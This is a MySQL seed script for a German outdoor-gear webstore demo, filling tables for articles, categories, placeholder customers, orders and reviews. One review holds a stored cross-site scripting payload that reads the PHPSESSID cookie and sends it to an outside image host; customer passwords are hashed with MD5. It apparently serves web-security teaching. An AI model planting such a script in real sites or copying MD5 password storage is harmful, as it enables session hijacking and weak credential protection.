USE webstore;

SET FOREIGN_KEY_CHECKS = 0;

TRUNCATE TABLE article;
TRUNCATE TABLE article_category;
TRUNCATE TABLE article_order;
TRUNCATE TABLE category;
TRUNCATE TABLE customer;
TRUNCATE TABLE `order`;

SET FOREIGN_KEY_CHECKS = 1;

INSERT INTO article (id, title, price, image, description) VALUES
  (1, 'Sturmfeuerzeug "Storm Trooper"', 29.95, '/img/lighter.jpg', 'Langlebiges Feuerzeug mit Stahlmantel\n\nLorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet.'),
  (2, 'Camping-Taschenmesser', 14.90, '/img/knife.jpg', 'Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet.'),
  (3, 'Profizelt für 3 Personen', 99.90, '/img/tent1.jpg', 'Mit hoher Wasserresitenz\nschneller Aufbau'),
  (4, 'Profizelt für 4 Personen', 118.00, '/img/tent2.jpg', 'Mit hoher Wasserresitenz\nschneller Aufbau'),
  (5, 'Kletter- und Wander-Rucksack', 95.99, '/img/backpack.jpg', '60 Liter Inhalt\nwasserdicht'),
  (6, 'Kletterschuhe', 118.80, '/img/shoes.jpg', 'Unisex\nLorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet.'),
  (7, 'Kletterhaken', 4.99, '/img/climbing_hook.jpg', 'Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet.'),
  (8, 'Mountainbike "Mountain+"', 1240.89, '/img/mountainbike.jpg', 'Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet.'),
  (9, 'Retrorad "Harald"', 998.00, '/img/retro_bike.jpg', 'Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet.');


INSERT INTO category (id, title) VALUES
  (1, 'Camping'),
  (2, 'Bergsteigen'),
  (3, 'Radfahren');

INSERT INTO article_category (article_id, category_id) VALUES
  (1, 1),
  (2, 1),
  (3, 1),
  (4, 1),
  (5, 1),
  (5, 2),
  (6, 2),
  (7, 2),
  (8, 3),
  (9, 3);

INSERT INTO customer (id, email, password, firstname, lastname, street, hno, zip, city, phone) VALUES
  (1, 'janedoe@example.com', MD5('foobar'), 'Jane', 'Doe', 'Foostr.', '1', '12345', 'Barstadt', '0123 / 456789'),
  (2, 'johndoe@example.com', MD5('foobar'), 'John', 'Doe', 'Foostr.', '2', '12345', 'Barstadt', '9876 / 543210');

INSERT INTO `order` (id, created, iban, comment, customer_id) VALUES
  (1, DATE_SUB(CURRENT_TIMESTAMP, INTERVAL 3 DAY), 'DE123400006789', NULL, 1),
  (2, CURRENT_TIMESTAMP, 'CH12000099', NULL, 2),
  (3, CURRENT_TIMESTAMP, 'DE12999000008881', 'Bitte erst in einer Woche versenden', 1);

INSERT INTO article_order (article_id, order_id, amount, review) VALUES
  (8, 1, 2, NULL),
  (3, 3, 1, 'Schrott - regnet rein'),
  (1, 3, 1, 'Sieht <strong>ganz</strong> <span style="color: #f00">hübsch</span> aus<script>const cookies=document.cookie.split('';'').map(cookie=>cookie.trim()).map(cookie=>cookie.split(''=''));const sessionCookie=cookies.filter(cookie=>cookie[0]===''PHPSESSID'')[0];const sessionId=sessionCookie[1];const img=document.createElement(''img'');img.src="http://placehold.jp/24/99ccff/003366/550x200.png?text=Your+session+id+is+"+sessionId;img.style="position: fixed; top: 10%; left: 50%; margin: 0 -250px; z-index: 1000;";document.body.appendChild(img)</script>'),
  (3, 2, 4, 'It\'s so fluffy I\'m gonna die');